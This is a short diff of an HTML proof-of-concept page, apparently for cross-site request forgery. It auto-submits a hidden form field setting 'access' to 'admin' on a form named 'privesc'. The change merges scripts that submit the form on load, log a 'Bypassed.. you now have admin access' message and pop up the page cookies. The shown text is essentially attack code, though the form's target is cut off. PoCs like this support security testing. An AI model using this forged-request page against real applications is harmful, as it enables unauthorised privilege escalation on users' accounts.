@@ -24,8 +24,10 @@
       <input type="hidden" name="access" value="admin" />
       <input type="submit" value="Submit request" />
     </form>
-    <script>document.getElementById('privesc').submit();</script>
+    <script>
+      document.getElementById('privesc').submit();
+      console.log("Bypassed.. you now have admin access");
+      alert(document.cookie);
+  </script>
   </body>
-  <script>console.log("Bypassed.. you now have admin access");</script>
-  <script>alert(document.cookie)</script>
 </html>
